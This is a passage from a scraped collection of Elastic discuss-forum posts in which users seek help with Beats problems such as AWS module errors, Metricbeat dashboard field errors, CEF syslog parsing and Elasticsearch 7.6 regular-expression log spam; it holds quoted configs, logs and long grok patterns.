[publisher] pipeline/retry.go:175 done Mar 22 11:23:45 client-box packetbeat[8926]: 2020-03-22T11:23:45.524Z INFO elasticsearch/client.go:757 Attempting to connect to Elasticsearch version 7.4.2 Mar 22 11:23:47 client-box packetbeat[8926]: 2020-03-22T11:23:47.649Z INFO [monitoring] log/log.go:145 Non-zero metrics in the last 30s {\"monitoring\": {\"metrics\": {\"beat\":{\"cpu\":{\"system\":{\"ticks\":320,\"time\":{\"ms\":3}},\"total\":{\"ticks\":2610,\"time\":{\"ms\":52},\"value\":2610},\"user\":{\"ticks\":2290,\"time\":{\"ms\":49}}},\"handles\":{\"limit\":{\"hard\":4096,\"soft\":1024},\"open\":8},\"info\":{\"ephemeral_id\":\"6807605d-45bf-4247-a964-8c84b1e0fe0e\",\"uptime\":{\"ms\":2430020}},\"memstats\":{\"gc_next\":75363584,\"memory_alloc\":37790800,\"memory_total\":162906880},\"runtime\":{\"goroutines\":40}},\"libbeat\":{\"config\":{\"module\":{\"running\":0}},\"output\":{\"read\":{\"bytes\":996},\"write\":{\"bytes\":370}},\"pipeline\":{\"clients\":15,\"events\":{\"active\":4117,\"retry\":4}}},\"system\":{\"load\":{\"1\":0,\"15\":0,\"5\":0,\"norm\":{\"1\":0,\"15\":0,\"5\":0}}}}}} Can someone please help ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2c5ba9a5-f942-4ceb-8427-50da856516d2",
    "url": "https://discuss.elastic.co/t/filebeat-aws-region-error/225832",
    "title": "Filebeat aws region error",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "Samerd",
    "date": "March 31, 2020, 10:21am April 1, 2020, 3:32pm April 2, 2020, 6:56am April 2, 2020, 2:31pm",
    "body": "hi im tring to enable aws elb to send logs for my ELb. this is my AWS module config: and i got this error message : ERROR instance/beat.go:933 Exiting: Fileset aws/regions is configured but doesn't exist",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "671eaa5a-39ba-428a-9c0c-418d290b3790",
    "url": "https://discuss.elastic.co/t/aws-cloudwatch-cant-collect-s3-tags-from-aws-s3-namespace/225930",
    "title": "AWS Cloudwatch - Cant collect s3 tags from AWS/S3 namespace",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "Yotamloe",
    "date": "March 31, 2020, 6:00pm April 1, 2020, 10:23pm April 2, 2020, 8:45am April 2, 2020, 8:32am",
    "body": "Hi, i'm using metricbeat 7.5.1. I'm trying to collect daily storage metrics and s3 bucket tags with the cloudwatch metricset, but its failing to collect tags. I have succeeded to describe the tags in my aws account with AWS CLI and 'AWS Resource Groups Tagging API - get-resources' using 's3' in the resource type filter parameter. this is my Cloudwatch metric set configuration: - module: aws period: 86400s metricsets: - cloudwatch metrics: - namespace: AWS/S3 tags.resource_type_filter: s3 Can anyone help me figure out what could have go wrong here? Thanks in advance.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "b0156dbc-e4ea-4296-848f-2ff93b54ad32",
    "url": "https://discuss.elastic.co/t/filebeat-cef-module-cant-parse-event-as-syslog-rfc3164/226116",
    "title": "Filebeat CEF module can't parse event as syslog rfc3164",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "WBakeberg",
    "date": "April 1, 2020, 7:09pm April 1, 2020, 7:17pm April 2, 2020, 8:30am",
    "body": "Hello, we have just recently started ingesting syslog logs with the CEF module of Filebeat. We are receiving the error message: 2020-04-01T14:02:47.863-0500 ERROR [syslog] syslog/input.go:243 can't parse event as syslog rfc3164. I have seen other issues dealing with the time format of the syslog event being the wrong format. However, some events are being successfully ingested, and others are giving a parsing error. image1522×328 32.4 KB . The events seem identical. Any suggestions appreciated! Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "f6608fc4-a7a8-4d13-a4b5-47d2bf76a4cd",
    "url": "https://discuss.elastic.co/t/error-when-starting-metricbeat-with-v7-6-0/225965",
    "title": "Error when starting metricbeat with v7.6.0",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "integritytsui",
    "date": "April 1, 2020, 2:05am April 1, 2020, 9:14am April 2, 2020, 12:48am April 2, 2020, 1:07am April 2, 2020, 8:10am",
    "body": "I see this error when trying to start metricbeat on win10 system: 2020-04-01T08:32:08.830+0800 ERROR instance/beat.go:933 Exiting: 8 errors: protocol not available; protocol not available; protocol not available; protocol not available; protocol not available; protocol not available; protocol not available; protocol not available Here's the command to start: ./metricbeat -e Here is the metricbeat.yml: metricbeat.config.modules: # Glob pattern for configuration loading path: ${path.config}/modules.d/*.yml # Set to true to enable config reloading reload.enabled: false Here is the modules.d/system.yml: - module: system period: 10s metricsets: - cpu #- load - memory - network - process - process_summary - socket_summary #- entropy #- core #- diskio #- socket #- services process.include_top_n: by_cpu: 5 # include top 5 processes by CPU by_memory: 5 # include top 5 processes by memory - module: system period: 1m metricsets: - filesystem - fsstat processors: - drop_event.when.regexp: system.filesystem.mount_point: '^/(sys|cgroup|proc|dev|etc|host|lib)($|/)' - module: system period: 15m metricsets: - uptime",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "162630ae-28f6-4ea0-af95-e83178c93c6b",
    "url": "https://discuss.elastic.co/t/filebeat-panw-module-not-working-continued/223962",
    "title": "Filebeat PANW Module Not Working (continued)",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "savethebyte",
    "date": "March 17, 2020, 3:24pm April 2, 2020, 8:51am April 2, 2020, 3:10am",
    "body": "Continuing the discussion from Filebeat PANW Module Not Working: I have added true to /etc/filebeat/filebeat.yml with no change in behavior. filebeat.inputs: - type: log # Change to true to enable this input configuration. enabled: true I am still seeing the Palo Alto traffic arriving, just not being forwarded to elasticsearch.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ec186786-e6e7-4626-9454-1d32df9dbf17",
    "url": "https://discuss.elastic.co/t/packetbeat-docker-image-help-and-setup-subcommands-fail-without-cap-add-net-admin/225314",
    "title": "Packetbeat docker image 'help' and 'setup' subcommands fail without --cap-add=NET_ADMIN",
    "category": [
      "Beats",
      "Packetbeat"
    ],
    "author": "",
    "date": "March 27, 2020, 12:16am April 1, 2020, 7:00pm April 1, 2020, 6:47pm",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "8c675a8c-adfd-4478-9c1f-50ccd8bf9be7",
    "url": "https://discuss.elastic.co/t/metricbeat-fields-and-dashboards-only-create-fields-and-dashboard-for-configured-module/225907",
    "title": "Metricbeat fields and dashboards - Only create fields and dashboard for configured module",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "ritchierich",
    "date": "March 31, 2020, 3:59pm April 1, 2020, 9:10am April 1, 2020, 6:44pm",
    "body": "What's easiest way to not to generate fields and dashboards and only modules that are configure. For example, I do not use aerospike, but fields are create along with visualizations and dashboards. Cheers, Rich",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "e6664a2f-159e-4eed-83e5-8029b55e7210",
    "url": "https://discuss.elastic.co/t/metricbeat-kibana-dashboards-esaggs-field-is-a-required-parameter/225860",
    "title": "Metricbeat + Kibana Dashboards [esaggs] > \"field\" is a required parameter",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "ffknob",
    "date": "March 31, 2020, 3:35pm March 31, 2020, 3:39pm April 1, 2020, 9:07am April 1, 2020, 11:20am April 1, 2020, 4:54pm April 1, 2020, 5:41pm",
    "body": "Hello, I've just deployed a cluster in the Elastic Cloud and configured a metricbeat agent to send metrics to that cluster. Here is my metricbeat.yml: name: \"xyz.acme.co\" tags: [\"ACME\", \"acme.co\"] setup.ilm.check_exists: false cloud.id: \"...\" setup.kibana.host: \"...\" setup.kibana.protocol: \"https\" setup.dashboards.enabled: true metricbeat.modules: - module: system enabled: true period: 1m Shouldn't Metricbeat's \"setup --dashboards\" and \"setup.dashboards.enabled: true\" only set up dashboards for the agent's configured modules? I am getting alot of errors trying when accessing the dashboards: Below you can see the [esaggs] > \"field\" is a required parameter errors... Bildschirmfoto vom 2020-03-31 09-23-081335×619 99.2 KB When taking a look at one specific visualization I can see that the field config is not set (it should be set to \"host.name\" accordingly to the saved object config, but in the index pattern that's not an aggregatable field): Bildschirmfoto vom 2020-03-31 09-24-191364×639 60.8 KB If I set it to host.name.keyword it works: Bildschirmfoto vom 2020-03-31 09-25-151366×629 42.7 KB Here is the Saved Object code. You can see that it acctually is set to use the host.name: This is related to [Metricbeat Docker] Overview ECS is showing no data and error: [esaggs] > \"field\" is a required parameter, but I've already tryied to delete index, template, index pattern, even saved objects... no luck. Thank you!",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "4094ceca-9803-4ea3-a695-26e67a81cf17",
    "url": "https://discuss.elastic.co/t/problem-with-module-elasticsearch-of-filebeat-or-ingest-pipeline-in-7-6-0-7-6-2/226075",
    "title": "Problem with module elasticsearch of filebeat or ingest pipeline in 7.6.0, 7.6.2",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "v.n",
    "date": "April 1, 2020, 4:38pm April 14, 2020, 1:44pm",
    "body": "Hello! From the moment we have upgraded to 7.6.0 we have tons of info at /var/log/messages such as Apr 1 17:12:37 ct-ms-sr-vmdb06 elasticsearch: regular expression has redundant nested repeat operator * /(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)|(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\])) Total time for which application threads were stopped: (?<BASE10NUM:elasticsearch.gc.threads_total_stop_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) seconds, Stopping threads took: (?<BASE10NUM:elasticsearch.gc.stopping_threads_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) seconds)|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)) \\[GC \\((?<DATA:elasticsearch.gc.phase.name>.*?)\\) \\[YG occupancy: (?<BASE10NUM:elasticsearch.gc.young_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) K \\((?<BASE10NUM:elasticsearch.gc.young_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) K\\)\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[Rescan \\(parallel\\) , (?<BASE10NUM:elasticsearch.gc.phase.parallel_rescan_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[weak refs processing, (?<BASE10NUM:elasticsearch.gc.phase.weak_refs_processing_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[class unloading, (?<BASE10NUM:elasticsearch.gc.phase.class_unload_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[scrub symbol table, (?<BASE10NUM:elasticsearch.gc.phase.scrub_symbol_table_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[scrub string table, (?<BASE10NUM:elasticsearch.gc.phase.scrub_string_table_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]\\[1 CMS-remark: (?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\)\\] (?<BASE10NUM:elasticsearch.gc.heap.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.heap.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\), (?<BASE10NUM:elasticsearch.gc.phase.duration_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\] (?:\\[Times: user=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.user_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) sys=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.sys_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))), real=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.real_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]))|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)) \\[GC \\((?<DATA:elasticsearch.gc.phase.name>.*?)\\) \\[(?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) CMS-initial-mark: (?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\)\\] (?<BASE10NUM:elasticsearch.gc.heap.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.heap.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\), (?<BASE10NUM:elasticsearch.gc.phase.duration_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\] (?:\\[Times: user=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.user_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) sys=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.sys_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))), real=(?<BASE10NUM:elasticsearch.gc.phase.cpu_time.real_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) secs\\]))|(?:(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\]) GC\\((?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))\\) ParNew: (?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K-\\>(?<BASE10NUM:elasticsearch.gc.young_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.young_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\))|(?:(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\]) GC\\((?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))\\) Old: (?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K-\\>(?<BASE10NUM:elasticsearch.gc.old_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\((?<BASE10NUM:elasticsearch.gc.old_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+))))K\\))|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)|(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\])) (?<GREEDYMULTILINE:message>(.| Today I have upgraded to 7.6.2 but nothing has changed. I found some topics about these spam but there was no solution. I disabled elasticsearch module in filebeat and got rid of spam in /var/log/messages but to my mind it's not a solution. How to fix it?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "f2d16851-c5d8-404a-bee1-5c63eb76b2e4",
    "url": "https://discuss.elastic.co/t/weird-behavior-kibana-and-metricbeat-dashboards/224934",
    "title": "Weird behavior Kibana and Metricbeat dashboards",
    "category": [
      "Beats",
      "Metricbeat"
    ],
    "author": "ElasticLiver",
    "date": "March 25, 2020, 12:44pm April 1, 2020, 3:37pm",
    "body": "Im having trouble to get the Metricbeat dashboards to work, testing configurations, this is the one that gives me best result but still are some problems. setup.dashboards.enabled: true setup.dashboards.directory: \"/usr/share/metricbeat/kibana\" setup.dashboards.index: \"test*\" setup.template.name: \"test_mtb\" setup.template.pattern: \"test_mtb*\" output.elasticsearch: hosts: [\"myip\"] username: \"myusr\" password: \"mypass\" index: \"test\" setup.ilm.enabled: auto setup.ilm.rollover_alias: \"test_mtb\" setup.ilm.pattern: \"{now/d}-000001\" Weird case one: this configuration doesn't create a kibana index pattern but most of the: \"[Metricbeat System] Overview ECS\" dashboard, and the \"[Metricbeat System] Host overview ECS\" dasboard works! WITHOUT A KIBANA INDEX PATTERN! Weird case two: some visualizations, in the dashboards mentioned before gives me this error: Could not locate that index-pattern (id:test*), [click here to re-create it](#/management/kibana/index_pattern) so what I did was create a kibana index pattern (test*) get the id of the index, pasted it in the visualization json and now that visualization works! [ { \"name\": \"kibanaSavedObjectMeta.searchSourceJSON.index\", \"type\": \"index-pattern\", \"id\": \"test*\" # replaced this for the id of the index }] Visualization without index patterns? Visualization with a name instead of an ID? What the F*** is going on? elastic and kibana version 7.5.1 metricbeat version 7.6.1",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0c673043-be17-442a-aaa4-41ec20e546d5",
    "url": "https://discuss.elastic.co/t/filebeat-no-create-object-property-alias/225388",
    "title": "Filebeat no create object property alias",
    "category": [
      "Beats"
    ],
    "author": "josgut",
    "date": "March 27, 2020, 10:46am April 1, 2020, 3:31pm",
    "body": "Hello, i'm trying to configure filebeat and use kibana iis sample dashboard, but i can't because filebeat setup doesn't create mapped alias of geoip object, for example, i see iis geoip object index template void, because it is all a set of alias pointing to \"source.geo.location\". Is it an filebeat 7.6.0 issue? Regards",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "db29f38a-bc8b-482a-bb0a-14bc5e4f7b20",
    "url": "https://discuss.elastic.co/t/urgent-elasticsearch-fails-to-start/226044",
    "title": "[Urgent] Elasticsearch fails to start",
    "category": [
      "Beats",
      "Filebeat"
    ],
    "author": "The-Big-K",
    "date": "April 1, 2020, 1:08pm April 1, 2020, 1:08pm April 1, 2020, 1:21pm April 1, 2020, 1:40pm April 1, 2020, 1:49pm April 1, 2020, 1:53pm April 1, 2020, 2:58pm",
    "body": "I've the latest Elasticsearch (updated 30 minutes ago); and it's still throwing the following error:- regular expression has redundant nested repeat operator * /\\[(?<TIMESTAMP_ISO8601:elasticsearch.deprecation.timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])| I see that I'm not the only one; because others are facing the issue: [ES 7.6] regular expression has redundant nested repeat operator This issue has rendered my elasticsearch + app-search setup totally useless. Can someone please help fix this? This is really urgent.",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "f1aacdd2-51a4-4fb5-8ba2-0fecfbb8c361",
    "url": "https://discuss.elastic.co/t/es-7-6-regular-expression-has-redundant-nested-repeat-operator/220835",
    "title": "[ES 7.6] regular expression has redundant nested repeat operator",
    "category": [
      "Beats"
    ],
    "author": "yurgers",
    "date": "February 27, 2020, 12:39pm February 27, 2020, 11:56am February 27, 2020, 12:39pm March 20, 2020, 1:03am March 23, 2020, 6:45am March 25, 2020, 8:38am March 25, 2020, 3:47pm April 1, 2020, 1:47pm",
    "body": "good day! I'm new to ELK Noticed that after updating ES to 7.6 a large number of messages started appearing in /var/log/messages Feb 25 13:55:01 elasticsearch elasticsearch[23298]: regular expression has redundant nested repeat operator * /(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)|(?:\\[(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?)\\]\\[(?<POSINT:process.pid>\\b(?:[1-9][0-9]*)\\b)\\]\\[(?<DATA:elasticsearch.gc.tags>.*?)(?:\\s*)*\\])) Total time for which application threads were stopped: (?<BASE10NUM:elasticsearch.gc.threads_total_stop_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) seconds, Stopping threads took: (?<BASE10NUM:elasticsearch.gc.stopping_threads_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) seconds)|(?:(?:(?:(?<TIMESTAMP_ISO8601:timestamp>(?:(?>\\d\\d){1,2})-(?:(?:0?[1-9]|1[0-2]))-(?:(?:(?:0[1-9])|(?:[12][0-9])|(?:3[01])|[1-9]))[T ](?:(?:2[0123]|[01][0-9])):?(?:(?:[0-5][0-9]))(?::?(?:(?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)))?(?:(?:Z|[+-](?:(?:2[0123]|[01]?[0-9]))(?::?(?:(?:[0-5][0-9])))))?): (?<BASE10NUM:elasticsearch.gc.jvm_runtime_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))):)) \\[GC \\((?<DATA:elasticsearch.gc.phase.name>.*?)\\) \\[YG occupancy: (?<BASE10NUM:elasticsearch.gc.young_gen.used_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) K \\((?<BASE10NUM:elasticsearch.gc.young_gen.size_kb>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) K\\)\\](?:(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))): \\[Rescan \\(parallel\\) , (?<BASE10NUM:elasticsearch.gc.phase.parallel_rescan_time_sec>(?<![0-9.+-])(?>[+-]?(?:(?:[0-9]+(?:\\.[0-9]+)?)|(?:\\.[0-9]+)))) 